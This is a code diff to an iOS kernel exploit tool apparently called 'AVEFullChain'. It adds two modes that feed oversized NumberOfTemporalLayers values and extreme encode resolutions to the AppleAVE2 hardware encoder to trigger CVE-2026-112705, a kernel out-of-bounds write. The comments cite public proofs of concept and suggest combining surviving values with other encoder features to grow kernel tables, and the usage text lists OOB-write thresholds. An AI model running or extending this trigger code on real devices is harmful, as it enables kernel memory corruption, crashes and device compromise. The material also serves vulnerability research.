@@ -3113,6 +3113,185 @@ cleanup_dummies:
         rlog("If test shows higher pset counts, PrepareToEncodeFrames\n");
         rlog("writes to VPS tables in kernel independently of encode.\n");
 
+    } else if (strcmp(mode, "temporal_layers") == 0) {
+        /*
+         * CVE-2026-112705: NumberOfTemporalLayers with out-of-range value
+         * triggers kernel OOB write in AppleAVE2. Fixed in iOS 27.2.
+         * iOS 27.1 SHOULD be vulnerable.
+         *
+         * Public PoC says value 16463 causes kernel panic.
+         * We test with SAFE values first (1-8), then probe boundary.
+         *
+         * WARNING: Values > ~100 may kernel panic! Use with caution.
+         */
+        int max_layers = (argc > 2) ? atoi(argv[2]) : 8;
+        int unsafe = (argc > 3 && strcmp(argv[3], "unsafe") == 0) ? 1 : 0;
+        if (max_layers < 1) max_layers = 1;
+        if (!unsafe && max_layers > 32) {
+            rlog("Capping at 32 for safety. Pass 'unsafe' as 3rd arg to go higher.\n");
+            max_layers = 32;
+        }
+        if (max_layers > 16463) max_layers = 16463;
+
+        rlog("=== TEMPORAL_LAYERS: Testing values 1-%d ===\n", max_layers);
+        if (unsafe) rlog("*** UNSAFE MODE — may kernel panic! ***\n");
+        rlog("CVE-2026-112705: OOB write via NumberOfTemporalLayers\n\n");
+
+        int w = 1920, h = 1080;
+
+        for (int layers = 1; layers <= max_layers; layers++) {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
+                kCFBooleanTrue);
+
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+
+            if (st != noErr || !s) {
+                rlog("layers=%d: session create FAILED (%d)\n", layers, (int)st);
+                continue;
+            }
+
+            /* Set temporal layers */
+            CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &layers);
+            OSStatus prop_st = VTSessionSetProperty(s,
+                CFSTR("NumberOfTemporalLayers"), nlayers);
+            CFRelease(nlayers);
+
+            rlog("layers=%d: SetProperty=%d", layers, (int)prop_st);
+
+            if (prop_st != noErr) {
+                rlog(" (rejected by VT)\n");
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+                continue;
+            }
+
+            /* PrepareToEncodeFrames — this may trigger the kernel-side setup */
+            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
+            rlog(", Prepare=%d", (int)pr);
+
+            if (pr != noErr) {
+                rlog(" (prepare failed)\n");
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+                continue;
+            }
+
+            /* Encode one frame */
+            int enc_st2 = encode_one(s, 0, w, h);
+            rlog(", Encode=%d, pset_count=%zu, bytes=%zu\n",
+                 enc_st2, g_last_pset_count, g_last_pset_total_bytes);
+
+            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+
+            /* If we survived, the value didn't panic */
+            if (layers > 8 && layers % 10 == 0) {
+                rlog("  (survived layers=%d, continuing...)\n", layers);
+            }
+        }
+
+        rlog("\n=== TEMPORAL_LAYERS complete ===\n");
+        rlog("If panic occurred, check /var/log/panic.log for data abort.\n");
+        rlog("Safe values that passed can be combined with MV-HEVC for\n");
+        rlog("additional VPS table entries.\n");
+
+    } else if (strcmp(mode, "resolution_probe") == 0) {
+        /*
+         * Lak453 PoC for CVE-2026-112705: H.264 at 32768x16384 with BGRA
+         * causes kernel panic. Test with HEVC at various large resolutions
+         * to find the boundary where bounds checks fail.
+         */
+        rlog("=== RESOLUTION_PROBE: Testing large encoder resolutions ===\n");
+        rlog("Based on Lak453 CVE-2026-112705 reproducer.\n\n");
+
+        int test_sizes[][2] = {
+            {3840, 2160},   /* 4K — should work */
+            {4096, 2160},   /* DCI 4K */
+            {7680, 4320},   /* 8K */
+            {8192, 4320},
+            {16384, 8640},
+            {32768, 16384}, /* Lak453 trigger (H.264) */
+        };
+        int num_tests = sizeof(test_sizes) / sizeof(test_sizes[0]);
+
+        int safe_only = !(argc > 2 && strcmp(argv[2], "unsafe") == 0);
+        if (safe_only) {
+            num_tests = 4; /* skip 16K and 32K */
+            rlog("Safe mode: testing up to 8192x4320. Pass 'unsafe' to test larger.\n\n");
+        }
+
+        for (int t = 0; t < num_tests; t++) {
+            int tw = test_sizes[t][0], th = test_sizes[t][1];
+            rlog("Testing %dx%d HEVC... ", tw, th);
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
+                kCFBooleanTrue);
+
+            OSStatus st = VTCompressionSessionCreate(NULL, tw, th,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+
+            if (st != noErr || !s) {
+                rlog("create FAILED (%d)\n", (int)st);
+                continue;
+            }
+
+            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (pr != noErr) {
+                rlog("prepare FAILED (%d)\n", (int)pr);
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+                continue;
+            }
+
+            /* Try to create pixel buffer at this size */
+            CVPixelBufferRef pb = NULL;
+            NSDictionary *pbattrs = NULL;
+            CVReturn cvr = CVPixelBufferCreate(NULL, tw, th,
+                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
+
+            if (cvr != kCVReturnSuccess || !pb) {
+                rlog("pixelbuf FAILED (%d) — too large for device memory\n", (int)cvr);
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+                continue;
+            }
+
+            /* Try encode */
+            g_encode_done = 0;
+            g_cb_status = -999;
+            CMTime pts = CMTimeMake(0, 30);
+            st = VTCompressionSessionEncodeFrame(s, pb, pts, CMTimeMake(1,30),
+                NULL, NULL, NULL);
+            rlog("encode=%d", (int)st);
+
+            if (st == noErr) {
+                /* Wait for callback */
+                for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                rlog(", cb=%d, pset=%zu, bytes=%zu",
+                     (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
+            }
+            rlog("\n");
+
+            CVPixelBufferRelease(pb);
+            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        rlog("\n=== RESOLUTION_PROBE complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -3144,6 +3323,8 @@ cleanup_dummies:
         rlog("  prepare_spam [count]   -- Spam PrepareToEncodeFrames without encoding\n");
         rlog("  property_cycle [cycles] -- Change properties between encodes to trigger SetSessionSettings\n");
         rlog("  interleave_prepare [prep] [enc] -- Interleave PrepareToEncodeFrames between encodes\n");
+        rlog("  temporal_layers [max] [unsafe] -- CVE-2026-112705: test NumberOfTemporalLayers boundary\n");
+        rlog("  resolution_probe [unsafe]      -- Test large resolution kernel OOB (CVE-2026-112705 variant)\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
